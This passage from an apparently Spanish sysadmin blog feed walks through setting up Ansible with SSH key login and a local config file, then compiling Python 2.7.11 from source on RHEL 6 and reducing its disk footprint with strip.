+--&lt;span class="o"&gt;[&lt;/span&gt; RSA &lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;----+
&lt;span class="p"&gt;|&lt;/span&gt;        .. .     &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;         .+      &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;        . oo     &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; ..    &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;      . S o. o   &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;     . + &lt;span class="o"&gt;=&lt;/span&gt;+.. .  &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;      . &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;o. .   &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;        +   .o.  &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;       .    ..E  &lt;span class="p"&gt;|&lt;/span&gt;
+-----------------+
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto va a generar una carpeta &lt;em&gt;.ssh&lt;/em&gt; en nuestra carpeta personal, con dos ficheros generados: &lt;em&gt;id_rsa&lt;/em&gt; (clave privada) e &lt;em&gt;id_rsa.pub&lt;/em&gt; (clave pública). La idea es que la clave privada se va a ofrecer automáticamente cuando se haga &lt;strong&gt;ssh&lt;/strong&gt;, y si la parte pública esta en &lt;em&gt;~/.ssh/authorized_keys&lt;/em&gt; del usuario remoto, el login se hace automático.&lt;/p&gt;
&lt;p&gt;La clave privada es sagrada, y no debe entregarse a nadie. Sin embargo, la parte pública es la que se va a poner en todas las máquinas controladas. Se trata de una línea que vamos a añadir al &lt;em&gt;authorized_keys&lt;/em&gt; de todas las máquinas, así que la apuntamos en algún sitio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/hobjbaSNX4zP/wjke5FY910xk5VwW0WaAO10ILAbvhuswdghLbMBdgt+4tWIwFM4DgOwA62wQ04lPsxpQ7Ya4VVmVVZLN5oN2BGQ2ixV6ofB8PA51vNDO5p0xz4ExYebXu8qshrOi4ulcSsc1rEDhlT+zZkYApjVOcgmO7T7T6149XWWBH0YSFEOto8qF+YiyS2yMlVy5p6QruHNPwcr6kC0z13aYrNUnk5VXFwlOSRtUTYMZ+c0ysh49uTDm50AWoccuDUK0v0juNWnHfQw1PFYLaQZLmJEWIkIsND3pBACHdFTyJDGDOB2Kuw+DCaAxp5vqPt5zFuidVS0h5Mw&lt;span class="o"&gt;==&lt;/span&gt; gerard@toolbox
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En la máquina controlada, añadimos la línea de la clave pública en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;. Vamos a controlar login automático contra el usuario &lt;em&gt;root&lt;/em&gt; en nuestra máquina de ejemplo misma.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# cat .ssh/authorized_keys&lt;/span&gt;
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/hobjbaSNX4zP/wjke5FY910xk5VwW0WaAO10ILAbvhuswdghLbMBdgt+4tWIwFM4DgOwA62wQ04lPsxpQ7Ya4VVmVVZLN5oN2BGQ2ixV6ofB8PA51vNDO5p0xz4ExYebXu8qshrOi4ulcSsc1rEDhlT+zZkYApjVOcgmO7T7T6149XWWBH0YSFEOto8qF+YiyS2yMlVy5p6QruHNPwcr6kC0z13aYrNUnk5VXFwlOSRtUTYMZ+c0ysh49uTDm50AWoccuDUK0v0juNWnHfQw1PFYLaQZLmJEWIkIsND3pBACHdFTyJDGDOB2Kuw+DCaAxp5vqPt5zFuidVS0h5Mw&lt;span class="o"&gt;==&lt;/span&gt; gerard@toolbox
&lt;span class="o"&gt;[&lt;/span&gt;root@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una vez que tengamos las claves &lt;strong&gt;SSH&lt;/strong&gt; distribuidas, y &lt;strong&gt;python&lt;/strong&gt; instalado en las máquinas controladas, podemos probar. Para ello, vamos a añadir esta máquina en el fichero de &lt;em&gt;hosts&lt;/em&gt;, sea por nombre o por dirección IP.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat hosts
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lanzamos el módulo &lt;strong&gt;ping&lt;/strong&gt; a todas las máquinas (que solo es la de test, de momento).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./ansible/bin/ansible -u root -i hosts -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando un fichero de configuración&lt;/h2&gt;
&lt;p&gt;Las opciones por defecto de &lt;strong&gt;ansible&lt;/strong&gt; son bastante correctas, pero hay algunos parámetros que se pueden poner por fichero de configuración; esto nos facilita bastante las cosas. Este fichero de configuración es el primero que se encuentre siguiendo este orden:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ANSIBLE_CONFIG (lo que diga esta variable de entorno)&lt;/li&gt;
&lt;li&gt;ansible.cfg (en el directorio actual de trabajo)&lt;/li&gt;
&lt;li&gt;.ansible.cfg (en la carpeta personal de nuestro usuario)&lt;/li&gt;
&lt;li&gt;/etc/ansible/ansible.cfg&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De hecho, si os parece bien utilizar carpetas de sistema, la última opción es la normal. Sin embargo, me interesa restringirme a mi carpeta local, por falta de permisos habitualmente.&lt;/p&gt;
&lt;p&gt;De la misma manera, el fichero de &lt;em&gt;hosts&lt;/em&gt; se busca en un sitio concreto, que con la configuración estándar es &lt;em&gt;/etc/ansible/hosts&lt;/em&gt;, a menos que se indique explícitamente el flag &lt;em&gt;-i&lt;/em&gt; en los comandos.&lt;/p&gt;
&lt;p&gt;Para evitar usar estos dos ficheros fuera de nuestra carpeta, vamos a crearlos en el &lt;strong&gt;virtualenv&lt;/strong&gt; creado, añadiéndolos en una carpeta &lt;em&gt;etc&lt;/em&gt;, que vamos a crear. Todos los parámetros se van a poner en el fichero de configuración y vamos a explicitar la localización del fichero de configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ mkdir ansible/etc
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat ansible/etc/ansible.cfg
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;inventory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /home/gerard/ansible/etc/hosts
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;remote_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ mv hosts ansible/etc/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras crear la configuración, la probamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nv"&gt;ANSIBLE_CONFIG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/gerard/ansible/etc/ansible.cfg ./ansible/bin/ansible -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para conseguir eliminar el &lt;em&gt;path&lt;/em&gt; absoluto del binario de ansible, lo añadimos en la variable de entorno &lt;em&gt;PATH&lt;/em&gt;. Para nuestra comodidadd, podemos definir ambas variables de entorno en el fichero &lt;em&gt;.bashrc&lt;/em&gt;. Este fichero se va a activar cada vez que se inicie &lt;strong&gt;bash&lt;/strong&gt;; para no cerrar y abrir sesión lo incluimos a mano.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ tail -2 .bashrc
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;ANSIBLE_CONFIG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/ansible/etc/ansible.cfg
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/ansible/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; .bashrc
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente obtenemos la versión mínima del comando a ejecutar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ansible -m ping all
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false,
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo queda poner mas servidores en el fichero de &lt;em&gt;hosts&lt;/em&gt; y lanzar comandos y &lt;em&gt;playbooks&lt;/em&gt; útiles contra los mismos.&lt;/p&gt;</content><category term="linux"></category><category term="redhat"></category><category term="centos"></category><category term="python"></category><category term="ansible"></category><category term="ssh"></category><category term="virtualenv"></category></entry><entry><title>Compilando python desde cero</title><link href="https://www.linuxsysadmin.ml/2016/04/compilando-python-desde-cero.html" rel="alternate"></link><published>2016-04-04T08:00:00+02:00</published><updated>2016-04-04T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-04:/2016/04/compilando-python-desde-cero.html</id><summary type="html">&lt;p&gt;Siempre que estoy trabajando en un servidor CentOS o RedHat, veo que las versiones de &lt;em&gt;python&lt;/em&gt; que usan son bastante viejas. De hecho, hay una gran mejora de &lt;em&gt;python&lt;/em&gt; entre las versiones 2.4, 2.6 y 2.7; así que es frecuente compilar una versión superior para nuestro uso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Siempre que estoy trabajando en un servidor CentOS o RedHat, veo que las versiones de &lt;em&gt;python&lt;/em&gt; que usan son bastante viejas. De hecho, hay una gran mejora de &lt;em&gt;python&lt;/em&gt; entre las versiones 2.4, 2.6 y 2.7; así que es frecuente compilar una versión superior para nuestro uso.&lt;/p&gt;
&lt;p&gt;Para este tutorial he usado una máquina virtual con un sistema operativo &lt;em&gt;RedHat&lt;/em&gt;. Realmente no necesita ninguna configuración &lt;em&gt;hardware&lt;/em&gt; adicional. Lo único relevante es que estamos tratando con una versión de &lt;em&gt;RedHat&lt;/em&gt; 6.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat /etc/redhat-release
Red Hat Enterprise Linux Server release &lt;span class="m"&gt;6&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;Santiago&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El otro requisito necesario es el fichero &lt;em&gt;tarball&lt;/em&gt; con las fuentes de &lt;em&gt;python&lt;/em&gt;. Esto lo podemos encontrar en &lt;a href="https://www.python.org/"&gt;la página de &lt;em&gt;python&lt;/em&gt;&lt;/a&gt;. Al tiempo de escritura, la última &lt;em&gt;release&lt;/em&gt; de la serie de &lt;em&gt;python&lt;/em&gt; 2 era la 2.7.11.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
--2016-03-29 &lt;span class="m"&gt;16&lt;/span&gt;:27:54--  https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
Resolving www.python.org... &lt;span class="m"&gt;185&lt;/span&gt;.31.17.223
Connecting to www.python.org&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;185&lt;/span&gt;.31.17.223&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;16856409&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;16M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: “Python-2.7.11.tgz”

&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[========================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;,856,409  &lt;span class="m"&gt;17&lt;/span&gt;.3M/s   in &lt;span class="m"&gt;0&lt;/span&gt;.9s

&lt;span class="m"&gt;2016&lt;/span&gt;-03-29 &lt;span class="m"&gt;16&lt;/span&gt;:27:55 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;.3 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “Python-2.7.11.tgz” saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;16856409&lt;/span&gt;/16856409&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Compilar las fuentes&lt;/h2&gt;
&lt;p&gt;Descomprimimos el &lt;em&gt;tarball&lt;/em&gt; y nos situamos en la carpeta recién creada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ tar xzf Python-2.7.11.tgz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; Python-2.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El procedimiento de compilación es el estándar: &lt;strong&gt;configure&lt;/strong&gt;, &lt;strong&gt;make&lt;/strong&gt; y &lt;strong&gt;make install&lt;/strong&gt;. Empezamos por configurarlo. Solo voy a añadir una carpeta que no interfiera con el sistema operativo, por ejemplo, &lt;em&gt;/opt/python27/&lt;/em&gt;. Otro punto interesante es el modificador &lt;strong&gt;--enable-shared&lt;/strong&gt;, para generar la librería &lt;em&gt;libpython2.7.so&lt;/em&gt;, por si nos hiciera falta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ ./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;/opt/python27
checking build system type... x86_64-unknown-linux-gnu
checking host system type... x86_64-unknown-linux-gnu
...
configure: creating ./config.status
config.status: creating Makefile.pre
config.status: creating Modules/Setup.config
config.status: creating Misc/python.pc
config.status: creating Modules/ld_so_aix
config.status: creating pyconfig.h
config.status: pyconfig.h is unchanged
creating Modules/Setup
creating Modules/Setup.local
creating Makefile
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Compilamos usando &lt;strong&gt;make&lt;/strong&gt; con el &lt;em&gt;Makefile&lt;/em&gt; recién generado por el &lt;em&gt;script&lt;/em&gt; &lt;strong&gt;configure&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ make
...
Python build finished, but the necessary bits to build these modules were not found:
_bsddb             _curses            _curses_panel
_sqlite3           _tkinter           bsddb185
bz2                dbm                dl
gdbm               imageop            readline
sunaudiodev
To find the necessary bits, look in setup.py in detect_modules&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; the module&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s name.

running build_scripts
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay algunos módulos de la librería estándar que necesitan las versiones &lt;strong&gt;-devel&lt;/strong&gt; de algunas librerías, aunque se pueden obviar y no se construyen.&lt;/p&gt;
&lt;p&gt;Opcionalmente podemos instalar algunas de esas librerías, y tras volver a ejecutar &lt;strong&gt;configure&lt;/strong&gt; y &lt;strong&gt;make&lt;/strong&gt;, se construirían esos módulos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente lo ponemos en su carpeta (&lt;em&gt;--prefix&lt;/em&gt;) mediante &lt;strong&gt;make install&lt;/strong&gt;. No tengo permiso de escritura en &lt;em&gt;/opt/&lt;/em&gt;, así que vamos a usar &lt;strong&gt;sudo&lt;/strong&gt; para todos los comandos que impliquen la carpeta &lt;em&gt;/opt/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ sudo make install
Creating directory /opt/python27/bin
Creating directory /opt/python27/lib
...
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobar que funciona&lt;/h2&gt;
&lt;p&gt;Vamos a ejecutar el binario &lt;strong&gt;python&lt;/strong&gt; para verificar que funciona y que estamos mirando la versión que toca. Vamos a usar la ruta completa para referirnos al binario, aunque lo ideal sería que estuviera en el &lt;em&gt;PATH&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ /opt/python27/bin/python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para ver que la librería estándar funciona y es utilizable, basta con importar alguno de sus módulos e invocar alguna de sus funciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$ /opt/python27/bin/python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11 &lt;span class="o"&gt;(&lt;/span&gt;default, Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;16&lt;/span&gt;:42:10&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.4.7 &lt;span class="m"&gt;20120313&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Red Hat &lt;span class="m"&gt;4&lt;/span&gt;.4.7-16&lt;span class="o"&gt;)]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import os
&amp;gt;&amp;gt;&amp;gt; os.uname&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Linux&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;foundry&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;3.10.0-327.10.1.el7.x86_64&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;#1 SMP Sat Jan 23 04:54:55 EST 2016&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;x86_64&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; exit&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto lo damos por bueno.&lt;/p&gt;
&lt;h2&gt;Opcional: reduciendo el espacio ocupado en disco&lt;/h2&gt;
&lt;p&gt;Nos posicionamos en la carpeta para analizar lo que ocupa.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/python27/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Miramos lo que ocupa cada carpeta dentro de la carpeta contendora.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;6&lt;/span&gt;.1M    bin
94M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El paso mas obvio es lanzar el comando &lt;strong&gt;strip&lt;/strong&gt;. Esto va a eliminar los símbolos de &lt;em&gt;debug&lt;/em&gt; y va a reducir el tamaño de los binarios y las librerías &lt;em&gt;.so&lt;/em&gt;. El resto va a ignorarse, previo mensaje de error, que vamos a ignorar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -type f &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs strip &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
76M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Algo hemos ganado; se han liberado unos 24 mb. Como nos resulta insuficiente, inspeccionemos la carpeta mas grande, que es la carpeta &lt;em&gt;lib/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh lib/* &lt;span class="p"&gt;|&lt;/span&gt; sort -h
&lt;span class="m"&gt;4&lt;/span&gt;.0K    lib/pkgconfig
&lt;span class="m"&gt;1&lt;/span&gt;.8M    lib/libpython2.7.a
74M     lib/python2.7
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La librería &lt;em&gt;libpython2.7.a&lt;/em&gt; es necesaria para compilar estáticamente binarios que vayan a incorporar la librería de &lt;em&gt;python&lt;/em&gt;. En este caso no la necesitamos y podemos liberar 1.8 mb adicionales.&lt;/p&gt;
